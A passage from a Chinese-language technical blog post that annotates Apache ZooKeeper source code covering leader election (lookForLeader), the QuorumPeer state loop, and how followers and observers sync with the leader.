class="keyword">try</span> &#123;</span><br><span class="line">                        LOG.info(<span class="string">"FOLLOWING"</span>);</span><br><span class="line">                        <span class="comment">//设置为follower</span></span><br><span class="line">                        setFollower(makeFollower(logFactory));</span><br><span class="line">                        <span class="comment">//和leader同步信息</span></span><br><span class="line">                        follower.followLeader();</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                        LOG.warn(<span class="string">"Unexpected exception"</span>,e);</span><br><span class="line">                    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                        follower.shutdown();</span><br><span class="line">                        setFollower(<span class="keyword">null</span>);</span><br><span class="line">                        setPeerState(ServerState.LOOKING);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> LEADING:</span><br><span class="line">                    LOG.info(<span class="string">"LEADING"</span>);</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="comment">//设置为leader</span></span><br><span class="line">                        setLeader(makeLeader(logFactory));</span><br><span class="line">                        <span class="comment">//调用lead</span></span><br><span class="line">                        leader.lead();</span><br><span class="line">                        setLeader(<span class="keyword">null</span>);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                        LOG.warn(<span class="string">"Unexpected exception"</span>,e);</span><br><span class="line">                    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (leader != <span class="keyword">null</span>) &#123;</span><br><span class="line">                            leader.shutdown(<span class="string">"Forcing shutdown"</span>);</span><br><span class="line">                            setLeader(<span class="keyword">null</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        setPeerState(ServerState.LOOKING);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            LOG.warn(<span class="string">"QuorumPeer main thread exited"</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                MBeanRegistry.getInstance().unregisterAll();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                LOG.warn(<span class="string">"Failed to unregister with JMX"</span>, e);</span><br><span class="line">            &#125;</span><br><span class="line">            jmxQuorumBean = <span class="keyword">null</span>;</span><br><span class="line">            jmxLocalPeerBean = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="looking-状态-makeLEStrategy-选举-leader"><a href="#looking-状态-makeLEStrategy-选举-leader" class="headerlink" title="looking 状态 makeLEStrategy 选举 leader"></a>looking 状态 makeLEStrategy 选举 leader</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//初始化leader选举协议</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> Election <span class="title">makeLEStrategy</span><span class="params">()</span></span>&#123;</span><br><span class="line">        LOG.debug(<span class="string">"Initializing leader election protocol..."</span>);</span><br><span class="line">        <span class="keyword">if</span> (getElectionType() == <span class="number">0</span>) &#123;</span><br><span class="line">            electionAlg = <span class="keyword">new</span> LeaderElection(<span class="keyword">this</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> electionAlg;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>寻找或者选举中 leader</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Vote <span class="title">lookForLeader</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            self.jmxLeaderElectionBean = <span class="keyword">new</span> LeaderElectionBean();</span><br><span class="line">            MBeanRegistry.getInstance().register(</span><br><span class="line">                    self.jmxLeaderElectionBean, self.jmxLocalPeerBean);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            LOG.warn(<span class="string">"Failed to register with JMX"</span>, e);</span><br><span class="line">            self.jmxLeaderElectionBean = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            self.setCurrentVote(<span class="keyword">new</span> Vote(self.getId(),</span><br><span class="line">                    self.getLastLoggedZxid()));</span><br><span class="line">            <span class="comment">// We are going to look for a leader by casting a vote for ourself</span></span><br><span class="line">            <span class="keyword">byte</span> requestBytes[] = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">4</span>];</span><br><span class="line">            ByteBuffer requestBuffer = ByteBuffer.wrap(requestBytes);</span><br><span class="line">            <span class="keyword">byte</span> responseBytes[] = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">28</span>];</span><br><span class="line">            ByteBuffer responseBuffer = ByteBuffer.wrap(responseBytes);</span><br><span class="line">            <span class="comment">/* The current vote for the leader. Initially me! */</span></span><br><span class="line">            DatagramSocket s = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                s = <span class="keyword">new</span> DatagramSocket();</span><br><span class="line">                s.setSoTimeout(<span class="number">200</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (SocketException e1) &#123;</span><br><span class="line">                LOG.error(<span class="string">"Socket exception when creating socket for leader election"</span>, e1);</span><br><span class="line">                System.exit(<span class="number">4</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            DatagramPacket requestPacket = <span class="keyword">new</span> DatagramPacket(requestBytes,</span><br><span class="line">                    requestBytes.length);</span><br><span class="line">            DatagramPacket responsePacket = <span class="keyword">new</span> DatagramPacket(responseBytes,</span><br><span class="line">                    responseBytes.length);</span><br><span class="line">            <span class="keyword">int</span> xid = epochGen.nextInt();</span><br><span class="line">            <span class="keyword">while</span> (self.isRunning()) &#123;</span><br><span class="line">                HashMap&lt;InetSocketAddress, Vote&gt; votes =</span><br><span class="line">                    <span class="keyword">new</span> HashMap&lt;InetSocketAddress, Vote&gt;(self.getVotingView().size());</span><br><span class="line"></span><br><span class="line">                requestBuffer.clear();</span><br><span class="line">                requestBuffer.putInt(xid);</span><br><span class="line">                requestPacket.setLength(<span class="number">4</span>);</span><br><span class="line">                HashSet&lt;Long&gt; heardFrom = <span class="keyword">new</span> HashSet&lt;Long&gt;();</span><br><span class="line">                <span class="keyword">for</span> (QuorumServer server : self.getVotingView().values()) &#123;</span><br><span class="line">                    LOG.info(<span class="string">"Server address: "</span> + server.addr);</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        requestPacket.setSocketAddress(server.addr);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (IllegalArgumentException e) &#123;</span><br><span class="line">                        <span class="comment">// Sun doesn't include the address that causes this</span></span><br><span class="line">                        <span class="comment">// exception to be thrown, so we wrap the exception</span></span><br><span class="line">                        <span class="comment">// in order to capture this critical detail.</span></span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(</span><br><span class="line">                                <span class="string">"Unable to set socket address on packet, msg:"</span></span><br><span class="line">                                + e.getMessage() + <span class="string">" with addr:"</span> + server.addr,</span><br><span class="line">                                e);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="comment">//发送请求信息</span></span><br><span class="line">                        s.send(requestPacket);</span><br><span class="line">                        responsePacket.setLength(responseBytes.length);</span><br><span class="line">                        <span class="comment">//接收响应信息</span></span><br><span class="line">                        s.receive(responsePacket);</span><br><span class="line">                        <span class="keyword">if</span> (responsePacket.getLength() != responseBytes.length) &#123;</span><br><span class="line">                            LOG.error(<span class="string">"Got a short response: "</span></span><br><span class="line">                                    + responsePacket.getLength());</span><br><span class="line">                            <span class="keyword">continue</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        responseBuffer.clear();</span><br><span class="line">                        <span class="keyword">int</span> recvedXid = responseBuffer.getInt();</span><br><span class="line">                        <span class="keyword">if</span> (recvedXid != xid) &#123;</span><br><span class="line">                            LOG.error(<span class="string">"Got bad xid: expected "</span> + xid</span><br><span class="line">                                    + <span class="string">" got "</span> + recvedXid);</span><br><span class="line">                            <span class="keyword">continue</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">long</span> peerId = responseBuffer.getLong();</span><br><span class="line">                        heardFrom.add(peerId);</span><br><span class="line">                        <span class="comment">//if(server.id != peerId)&#123;</span></span><br><span class="line">                            <span class="comment">//封装投票信息</span></span><br><span class="line">                            Vote vote = <span class="keyword">new</span> Vote(responseBuffer.getLong(),</span><br><span class="line">                                responseBuffer.getLong());</span><br><span class="line">                            InetSocketAddress addr =</span><br><span class="line">                                (InetSocketAddress) responsePacket</span><br><span class="line">                                .getSocketAddress();</span><br><span class="line">                            votes.put(addr, vote);</span><br><span class="line">                        <span class="comment">//&#125;</span></span><br><span class="line">                    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                        LOG.warn(<span class="string">"Ignoring exception while looking for leader"</span>,</span><br><span class="line">                                e);</span><br><span class="line">                        <span class="comment">// Errors are okay, since hosts may be</span></span><br><span class="line">                        <span class="comment">// down</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//投票结果</span></span><br><span class="line">                ElectionResult result = countVotes(votes, heardFrom);</span><br><span class="line">                <span class="comment">//如果没有选出leader,则重新投票</span></span><br><span class="line">                <span class="keyword">if</span> (result.numValidVotes == <span class="number">0</span>) &#123;</span><br><span class="line">                    self.setCurrentVote(<span class="keyword">new</span> Vote(self.getId(),</span><br><span class="line">                            self.getLastLoggedZxid()));</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">//胜出者&gt;=0</span></span><br><span class="line">                    <span class="keyword">if</span> (result.winner.getId() &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="comment">//设置当前投票信息</span></span><br><span class="line">                        self.setCurrentVote(result.vote);</span><br><span class="line"></span><br><span class="line">                        <span class="comment">//超过半数胜出</span></span><br><span class="line">                        <span class="keyword">if</span> (result.winningCount &gt; (self.getVotingView().size() / <span class="number">2</span>)) &#123;</span><br><span class="line">                            <span class="comment">//设置为胜出者的投票信息</span></span><br><span class="line">                            self.setCurrentVote(result.winner);</span><br><span class="line">                            s.close();</span><br><span class="line"></span><br><span class="line">                            Vote current = self.getCurrentVote();</span><br><span class="line">                            LOG.info(<span class="string">"Found leader: my type is: "</span> + self.getLearnerType());</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> (self.getLearnerType() == LearnerType.OBSERVER) &#123;</span><br><span class="line">                                <span class="keyword">if</span> (current.getId() == self.getId()) &#123;</span><br><span class="line">                                    <span class="comment">// This should never happen!</span></span><br><span class="line">                                    LOG.error(<span class="string">"OBSERVER elected as leader!"</span>);</span><br><span class="line">                                    Thread.sleep(<span class="number">100</span>);</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">else</span> &#123;</span><br><span class="line">                                    self.setPeerState(ServerState.OBSERVING);</span><br><span class="line">                                    Thread.sleep(<span class="number">100</span>);</span><br><span class="line">                                    <span class="keyword">return</span> current;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                <span class="comment">//设置集群状态</span></span><br><span class="line">                                self.setPeerState((current.getId() == self.getId())</span><br><span class="line">                                        ? ServerState.LEADING: ServerState.FOLLOWING);</span><br><span class="line">                                <span class="keyword">if</span> (self.getPeerState() == ServerState.FOLLOWING) &#123;</span><br><span class="line">                                    Thread.sleep(<span class="number">100</span>);</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">return</span> current;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span>(self.jmxLeaderElectionBean != <span class="keyword">null</span>)&#123;</span><br><span class="line">                    MBeanRegistry.getInstance().unregister(</span><br><span class="line">                            self.jmxLeaderElectionBean);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                LOG.warn(<span class="string">"Failed to unregister with JMX"</span>, e);</span><br><span class="line">            &#125;</span><br><span class="line">            self.jmxLeaderElectionBean = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="Observer-的-observeLeader-方法"><a href="#Observer-的-observeLeader-方法" class="headerlink" title="Observer 的 observeLeader 方法"></a>Observer 的 observeLeader 方法</h3><p>构造并同步 observer 信息</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//构造observer对象</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> Observer <span class="title">makeObserver</span><span class="params">(FileTxnSnapLog logFactory)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Observer(<span class="keyword">this</span>, <span class="keyword">new</span> ObserverZooKeeperServer(logFactory,</span><br><span class="line">                <span class="keyword">this</span>, <span class="keyword">new</span> ZooKeeperServer.BasicDataTreeBuilder(), <span class="keyword">this</span>.zkDb));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// observer和leader同步</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">observeLeader</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//注册jmx</span></span><br><span class="line">        zk.registerJMX(<span class="keyword">new</span> ObserverBean(<span class="keyword">this</span>, zk), self.jmxLocalPeerBean);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//查找leader</span></span><br><span class="line">            QuorumServer leaderServer = findLeader();</span><br><span class="line">            LOG.info(<span class="string">"Observing "</span> + leaderServer.addr);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">//连接到leader</span></span><br><span class="line">                connectToLeader(leaderServer.addr, leaderServer.hostname);</span><br><span class="line">                <span class="keyword">long</span> newLeaderZxid = registerWithLeader(Leader.OBSERVERINFO);</span><br><span class="line">                <span class="comment">//和leader同步</span></span><br><span class="line">                syncWithLeader(newLeaderZxid);</span><br><span class="line">                QuorumPacket qp = <span class="keyword">new</span> QuorumPacket();</span><br><span class="line">                <span class="keyword">while</span> (<span class="keyword">this</span>.isRunning()) &#123;</span><br><span class="line">                    <span class="comment">//读取数据包</span></span><br><span class="line">                    readPacket(qp);</span><br><span class="line">                    <span class="comment">//读取数据包</span></span><br><span class="line">                    processPacket(qp);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                LOG.warn(<span class="string">"Exception when observing the leader"</span>, e);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    sock.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e1) &#123;</span><br><span class="line">                    e1.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// clear pending revalidations</span></span><br><span class="line">                pendingRevalidations.clear();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            zk.unregisterJMX(<span class="keyword">this</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>和 leader 同步历史信息</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">syncWithLeader</span><span class="params">(<span class="keyword">long</span> newLeaderZxid)</span> <span class="keyword">throws</span> IOException, InterruptedException</span>&#123;</span><br><span class="line">        QuorumPacket ack = <span class="keyword">new</span> QuorumPacket(Leader.ACK, <span class="number">0</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">        QuorumPacket qp = <span class="keyword">new</span> QuorumPacket();</span><br><span class="line">        <span class="keyword">long</span> newEpoch = ZxidUtils.getEpochFromZxid(newLeaderZxid);</span><br><span class="line">        <span class="comment">// In the DIFF case we don't need to do a snapshot because the transactions will sync on top of any existing snapshot</span></span><br><span class="line">        <span class="comment">// For SNAP and TRUNC the snapshot is needed to save that history</span></span><br><span class="line">        <span class="keyword">boolean</span> snapshotNeeded = <span class="keyword">true</span>;</span><br><span class="line">        readPacket(qp);</span><br><span class="line">        LinkedList&lt;Long&gt; packetsCommitted = <span class="keyword">new</span> LinkedList&lt;Long&gt;();</span><br><span class="line">        LinkedList&lt;PacketInFlight&gt; packetsNotCommitted = <span class="keyword">new</span> LinkedList&lt;PacketInFlight&gt;();</span><br><span class="line">        <span class="keyword">synchronized</span> (zk) &#123;</span><br><span class="line">            <span class="keyword">if</span> (qp.getType() == Leader.DIFF) &#123;</span><br><span class="line">                LOG.info(<span class="string">"Getting a diff from the leader 0x&#123;&#125;"</span>, Long.toHexString(qp.getZxid()));</span><br><span class="line">                snapshotNeeded = <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 下载日志文件类型</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (qp.getType() == Leader.SNAP) &#123;</span><br><span class="line">                LOG.info(<span class="string">"Getting a snapshot from leader 0x"</span> + Long.toHexString(qp.getZxid()));</span><br><span class="line">                <span class="comment">// The leader is going to dump the database</span></span><br><span class="line">                <span class="comment">// clear our own database and read</span></span><br><span class="line">                zk.getZKDatabase().clear();</span><br><span class="line">                <span class="comment">//反序列化日志快照信息</span></span><br><span class="line">                zk.getZKDatabase().deserializeSnapshot(leaderIs);</span><br><span class="line">                String signature = leaderIs.readString(<span class="string">"signature"</span>);</span><br><span class="line">                <span class="keyword">if</span> (!signature.equals(<span class="string">"BenWasHere"</span>)) &#123;</span><br><span class="line">                    LOG.error(<span class="string">"Missing signature. Got "</span> + signature);</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">"Missing signature"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                zk.getZKDatabase().setlastProcessedZxid(qp.getZxid());</span><br><span class="line">                <span class="comment">//截断事务日志</span></span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (qp.getType() == Leader.TRUNC) &#123;</span><br><span class="line">                <span class="comment">//we need to truncate the log to the lastzxid of the leader</span></span><br><span class="line">                LOG.warn(<span class="string">"Truncating log to get in sync with the leader 0x"</span></span><br><span class="line">                        + Long.toHexString(qp.getZxid()));</span><br><span class="line">                <span class="keyword">boolean</span> truncated=zk.getZKDatabase().truncateLog(qp.getZxid());</span><br><span class="line">                <span class="keyword">if</span> (!truncated) &#123;</span><br><span class="line">                    <span class="comment">// not able to truncate the log</span></span><br><span class="line">                    LOG.error(<span class="string">"Not able to truncate the log "</span></span><br><span class="line">                            + Long.toHexString(qp.getZxid()));</span><br><span class="line">                    System.exit(<span class="number">13</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                zk.getZKDatabase().setlastProcessedZxid(qp.getZxid());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                LOG.error(<span class="string">"Got unexpected packet from leader "</span></span><br><span class="line">                        + qp.getType() + <span class="string">" exiting ... "</span> );</span><br><span class="line">                System.exit(<span class="number">13</span>);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//创建session跟踪</span></span><br><span class="line">            zk.createSessionTracker();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">long</span> lastQueued = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// in Zab V1.0 (ZK 3.4+) we might take a snapshot when we get the NEWLEADER message, but in pre V1.0</span></span><br><span class="line">            <span class="comment">// we take the snapshot on the UPDATE message, since Zab V1.0 also gets the UPDATE (after the NEWLEADER)</span></span><br><span class="line">            <span class="comment">// we need to make sure that we don't take the snapshot twice.</span></span><br><span class="line">            <span class="keyword">boolean</span> isPreZAB1_0 = <span class="keyword">true</span>;</span><br><span class="line">            <span class="comment">//If we are not going to take the snapshot be sure the transactions are not applied in memory</span></span><br><span class="line">            <span class="comment">// but written out to the transaction log</span></span><br><span class="line">            <span class="keyword">boolean</span> writeToTxnLog = !snapshotNeeded;</span><br><span class="line">            <span class="comment">// we are now going to start getting transactions to apply followed by an UPTODATE</span></span><br><span class="line">            outerLoop:</span><br><span class="line">            <span class="keyword">while</span> (self.isRunning()) &#123;</span><br><span class="line">                readPacket(qp);</span><br><span class="line">                <span class="keyword">switch</span>(qp.getType()) &#123;</span><br><span class="line">                <span class="keyword">case</span> Leader.PROPOSAL:</span><br><span class="line">                    PacketInFlight pif = <span class="keyword">new</span> PacketInFlight();</span><br><span class="line">                    pif.hdr = <span class="keyword">new</span> TxnHeader();</span><br><span class="line">                    <span class="comment">//反序列化</span></span><br><span class="line">                    pif.rec = SerializeUtils.deserializeTxn(qp.getData(), pif.hdr);</span><br><span class="line">                    <span class="keyword">if</span> (pif.hdr.getZxid() != lastQueued + <span class="number">1</span>) &#123;</span><br><span class="line">                    LOG.warn(<span class="string">"Got zxid 0x"</span></span><br><span class="line">                            + Long.toHexString(pif.hdr.getZxid())</span><br><span class="line">                            + <span class="string">" expected 0x"</span></span><br><span class="line">                            + Long.toHexString(lastQueued + <span class="number">1</span>));</span><br><span class="line">                    &#125;</span><br><span class="line">                    lastQueued = pif.hdr.getZxid();</span><br><span class="line">                    <span class="comment">//放入未提交链表</span></span><br><span class="line">                    packetsNotCommitted.add(pif);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="comment">//提交提议</span></span><br><span class="line">                <span class="keyword">case</span> Leader.COMMIT:</span><br><span class="line">                    <span class="keyword">if</span> (!writeToTxnLog) &#123;</span><br><span class="line">                        pif = packetsNotCommitted.peekFirst();</span><br><span class="line">                        <span class="keyword">if</span> (pif.hdr.getZxid() != qp.getZxid()) &#123;</span><br><span class="line">                            LOG.warn(<span class="string">"Committing "</span> + qp.getZxid() + <span class="string">", but next proposal is "</span> + pif.hdr.getZxid());</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            zk.processTxn(pif.hdr, pif.rec);</span><br><span class="line">                            packetsNotCommitted.remove();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">                        packetsCommitted.add(qp.getZxid());</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                    <span class="comment">//observer接收和提交提议</span></span><br><span class="line">                <span class="keyword">case</span> Leader.INFORM:</span><br><span class="line">                    <span class="comment">/*</span></span><br><span class="line"><span class="comment">                     * Only observer get this type of packet. We treat this</span></span><br><span class="line"><span class="comment">                     * as receiving PROPOSAL and COMMMIT.</span></span><br><span class="line"><span class="comment">                     */</span></span><br><span class="line">                    PacketInFlight packet = <span class="keyword">new</span> PacketInFlight();</span><br><span class="line">                    packet.hdr = <span class="keyword">new</span> TxnHeader();</span><br><span class="line">                    packet.rec = SerializeUtils.deserializeTxn(qp.getData(), packet.hdr);</span><br><span class="line">                    <span class="comment">// Log warning message if txn comes out-of-order</span></span><br><span class="line">                    <span class="keyword">if</span> (packet.hdr.getZxid() != lastQueued + <span class="number">1</span>) &#123;</span><br><span class="line">                        LOG.warn(<span class="string">"Got zxid 0x"</span></span><br><span class="line">                                + Long.toHexString(packet.hdr.getZxid())</span><br><span class="line">                                + <span class="string">" expected 0x"</span></span><br><span class="line">                                + Long.toHexString(lastQueued + <span class="number">1</span>));</span><br><span class="line">                    &#125;</span><br><span class="line">                    lastQueued = packet.hdr.getZxid();</span><br><span class="line">                    <span class="keyword">if</span> (!writeToTxnLog) &#123;</span><br><span class="line">                        <span class="comment">// Apply to db directly if we haven't taken the snapshot</span></span><br><span class="line">                        zk.processTxn(packet.hdr, packet.rec);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        packetsNotCommitted.add(packet);</span><br><span class="line">                        packetsCommitted.add(qp.getZxid());</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                    <span class="comment">//更新到最新时间</span></span><br><span class="line">                <span class="keyword">case</span> Leader.UPTODATE:</span><br><span class="line">                    <span class="keyword">if</span> (isPreZAB1_0) &#123;</span><br><span class="line">                        zk.takeSnapshot();</span><br><span class="line">                        self.setCurrentEpoch(newEpoch);</span><br><span class="line">                    &#125;</span><br><span class="line">                    self.cnxnFactory.setZooKeeperServer(zk);</span><br><span class="line">                    <span class="keyword">break</span> outerLoop;</span><br><span class="line">                    <span class="comment">//新的leader</span></span><br><span class="line">                <span class="keyword">case</span> Leader.NEWLEADER: <span class="comment">// Getting NEWLEADER here instead of in discovery</span></span><br><span class="line">                    <span class="comment">// means this is Zab 1.0</span></span><br><span class="line">                    <span class="comment">// Create updatingEpoch file and remove it after current</span></span><br><span class="line">                    <span class="comment">// epoch is set. QuorumPeer.loadDataBase() uses this file to</span></span><br><span class="line">                    <span class="comment">// detect the case where the server was terminated after</span></span><br><span class="line">                    <span class="comment">// taking a snapshot but before setting the current epoch.</span></span><br><span class="line">                    File updating = <span class="keyword">new</span> File(self.getTxnFactory().getSnapDir(),</span><br><span class="line">                                        QuorumPeer.UPDATING_EPOCH_FILENAME);</span><br><span class="line">                    <span class="keyword">if</span> (!updating.exists() &amp;&amp; !updating.createNewFile()) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">"Failed to create "</span> +</span><br><span class="line">                                              updating.toString());</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (snapshotNeeded) &#123;</span><br><span class="line">                        zk.takeSnapshot();</span><br><span class="line">                    &#125;</span><br><span class="line">                    self.setCurrentEpoch(newEpoch);</span><br><span class="line">                    <span class="keyword">if</span> (!updating.delete()) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">"Failed to delete "</span> +</span><br><span class="line">                                              updating.toString());</span><br><span class="line">                    &#125;</span><br><span class="line">                    writeToTxnLog = <span class="keyword">true</span>; <span class="comment">//Anything after this needs to go to the transaction log, not applied directly in memory</span></span><br><span class="line">                    isPreZAB1_0 = <span class="keyword">false</span>;</span><br><span class="line">                    writePacket(<span class="keyword">new</span> QuorumPacket(Leader.ACK, newLeaderZxid, <span class="keyword">null</span>, <span class="keyword">null</span>), <span class="keyword">true</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ack.setZxid(ZxidUtils.makeZxid(newEpoch, <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">        writePacket(ack, <span class="keyword">true</span>);</span><br><span class="line">        sock.setSoTimeout(self.tickTime * self.syncLimit);</span><br><span class="line">        <span class="comment">//启动对应的zkserver</span></span><br><span class="line">        zk.startup();</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Update the election vote here to ensure that all members of the</span></span><br><span class="line"><span class="comment">         * ensemble report the same vote to new servers that start up and</span></span><br><span class="line"><span class="comment">         * send leader election notifications to the ensemble.</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * @see https://issues.apache.org/jira/browse/ZOOKEEPER-1732</span></span><br><span class="line"><span class="comment">           更新投票信息，确保新的server收到最新的投票信息</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        self.updateElectionVote(newEpoch);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// follower获取增量日志信息</span></span><br><span class="line">        <span class="keyword">if</span> (zk <span class="keyword">instanceof</span> FollowerZooKeeperServer) &#123;</span><br><span class="line">            FollowerZooKeeperServer fzk = (FollowerZooKeeperServer)zk;</span><br><span class="line">            <span class="keyword">for</span>(PacketInFlight p: packetsNotCommitted) &#123;</span><br><span class="line">                fzk.logRequest(p.hdr, p.rec);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(Long zxid: packetsCommitted) &#123;</span><br><span class="line">                <span class="comment">//提交请求</span></span><br><span class="line">                fzk.commit(zxid);</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="comment">//observer 获取增量日志信息</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (zk <span class="keyword">instanceof</span> ObserverZooKeeperServer) &#123;</span><br><span class="line"></span><br><span class="line">            ObserverZooKeeperServer ozk = (ObserverZooKeeperServer) zk;</span><br><span class="line">            <span class="keyword">for</span> (PacketInFlight p : packetsNotCommitted) &#123;</span><br><span class="line">                Long zxid = packetsCommitted.peekFirst();</span><br><span class="line">                <span class="keyword">if</span> (p.hdr.getZxid() != zxid) &#123;</span><br><span class="line">                    <span class="comment">// log warning message if there is no matching commit</span></span><br><span class="line">                    <span class="comment">// old leader send outstanding proposal to observer</span></span><br><span class="line">                    LOG.warn(<span class="string">"Committing "</span> + Long.toHexString(zxid)</span><br><span class="line">                            + <span class="string">", but next proposal is 